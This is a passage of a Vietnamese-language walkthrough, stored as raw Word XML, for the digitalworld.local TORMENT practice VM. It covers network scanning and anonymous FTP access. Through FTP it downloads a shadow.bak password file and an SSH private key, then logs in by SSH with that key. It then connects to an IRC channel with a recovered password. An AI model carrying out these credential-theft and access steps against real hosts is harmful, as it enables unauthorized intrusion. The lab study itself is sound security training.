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A2978" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr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14. digitalworld.local TORMENT Enumeration and Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB8306A" w14:textId="77777777" w:rsidR="00BB3630" w:rsidRPr="00BB3630" w:rsidRDefault="00BB3630" w:rsidP="00BB3630">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BB3630">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Link tải:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58265329" w14:textId="77777777" w:rsidR="00BB3630" w:rsidRPr="00BB3630" w:rsidRDefault="00BB3630" w:rsidP="00BB3630">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00BB3630">
        <w:t>https://drive.google.com/drive/folders/13xmIa_lVQ8Hbw30phswyfslizyrwSOUI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473C0FA8" w14:textId="77777777" w:rsidR="00BB3630" w:rsidRDefault="00BB3630">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CB5C812" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>IP máy Kali: 192.168.56.122</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>IP máy mục tiêu: 192.168.56.125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C92E75" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 1. Xác định địa chỉ IP và quét dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45082920" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Xác định địa chỉ IP của máy Torment trong mạng nội bộ và thu thập thông tin về các cổng, dịch vụ đang hoạt động.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651E9CAB" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626D4979" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>nmap -A 192.168.56.125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A8A2BE" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Xác định được máy mục tiêu và các dịch vụ có thể tiếp tục kiểm tra.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA02CE7" w14:textId="77777777" w:rsidR="007702DC" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32DA9C08" wp14:editId="2B150695">
            <wp:extent cx="6309360" cy="4139565"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="278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F927" w14:textId="77777777" w:rsidR="007702DC" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80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7FCC2639" wp14:editId="71C69B1F">
            <wp:extent cx="6309360" cy="1950720"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="143844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49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A983" w14:textId="0321C37C" w:rsidR="00B57906" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41551DB9" wp14:editId="23BBF5B4">
            <wp:extent cx="6309360" cy="3873500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="57097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77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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75450B70" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 2. Truy cập dịch vụ FTP và tải các tệp cần thiết</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D4AF03" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Kiểm tra nội dung trên FTP, tải tệp shadow.bak và khóa SSH id_rsa về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4AF283" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0EB035" w14:textId="771B0AD5" w:rsidR="007702DC" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007702DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ftp 192.168.56.125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C465F23" w14:textId="33DEA44B" w:rsidR="00B57906" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>anonymous</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>ls -lah</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>get shadow.bak</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>cd .ssh</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>ls</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>get id_rsa</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BC897E" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thu được tệp shadow.bak và khóa riêng SSH id_rsa từ máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC6DDCD" w14:textId="77777777" w:rsidR="007702DC" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D4284A8" wp14:editId="74F8CF4D">
            <wp:extent cx="6309360" cy="5699125"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38221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17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D5CB" w14:textId="5A396615" w:rsidR="00B57906" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="670E1D6E" wp14:editId="02124E68">
            <wp:extent cx="6309360" cy="2599690"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="202885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54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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="30989461" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 3. Đăng nhập SSH bằng khóa riêng</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68811997" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thiết lập quyền phù hợp cho khóa riêng và thử đăng nhập vào tài khoản patrick qua SSH.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBF9337" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7F8B42" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>chmod 600 id_rsa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>ssh patrick@192.168.56.125 -i id_rsa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0E3A7F" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sử dụng khóa id_rsa để truy cập tài khoản patrick trên máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3150C75D" w14:textId="2C2F971A" w:rsidR="00B57906" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38C48C46" wp14:editId="604AA75C">
            <wp:extent cx="6309360" cy="1817370"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="170671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14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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FCFD67" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Bước 4. Tải và kiểm tra tệp channels</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E91F7E3" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tải tệp channels từ FTP và đọc nội dung để thu thập thêm thông tin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DFA466" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4288381B" w14:textId="6AE7DE12" w:rsidR="007702DC" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007702DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ftp 192.168.56.125</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0253D0BE" w14:textId="77777777" w:rsidR="00C83CB3" w:rsidRDefault="007702DC">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>anonymous</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB29ADF" w14:textId="1931E7F6" w:rsidR="00B57906" w:rsidRDefault="00C83CB3">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cd .ngircd</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>get channels</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>exit</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>cat channels</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EC313B" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thu được nội dung tệp channels phục vụ bước liệt kê tài khoản.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519DEFC0" w14:textId="77777777" w:rsidR="00C83CB3" w:rsidRDefault="00C83CB3">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22D434B3" wp14:editId="130B5209">
            <wp:extent cx="6309360" cy="4985385"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="20544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0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C66D" w14:textId="097E7E2A" w:rsidR="00B57906" w:rsidRDefault="00C83CB3">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54BACE53" wp14:editId="25028FA5">
            <wp:extent cx="6309360" cy="1066165"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="19141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0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br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F310CCD" w14:textId="692E966C" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">Bước 5. Cài đặt và mở </w:t>
      </w:r>
      <w:r w:rsidR="00CA3328">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Weechat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C50012" w14:textId="74A672D9" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Cài đặt công cụ </w:t>
      </w:r>
      <w:r w:rsidR="00CA3328">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Weechat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> để truy cập và kiểm tra thông tin kênh trò chuyện.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA08615" w14:textId="77777777" w:rsidR="00B57906" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B0FF78" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>cat channels</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57672168" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">apt update </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E811A63" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">apt install weechat -y </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261A97AB" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">nmap -sV --script irc-info -p 6667-6674 192.168.56.125 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA9E3E2" w14:textId="09DE0962" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>weechat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0190FBB0" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>/server add torment 192.168.56.125/6668</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0CABD8" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">/set irc.server.torment.tls off </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B2E210" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">/set irc.server.torment.password wealllikedebian </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BDBFB6" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">/connect torment </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F88BFC" w14:textId="61450AD7" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t>/join #tormentedprinter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25887BD6" w14:textId="77777777" w:rsidR="00CA3328" w:rsidRPr="00CA3328" w:rsidRDefault="00CA3328" w:rsidP="00CA3328">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA3328">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hoạt động:</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA3328">
        <w:t xml:space="preserve"> Kết nối đến IRC server và tham gia kênh #tormentedprinter.</w:t>
      </w:r>
    </w:p>
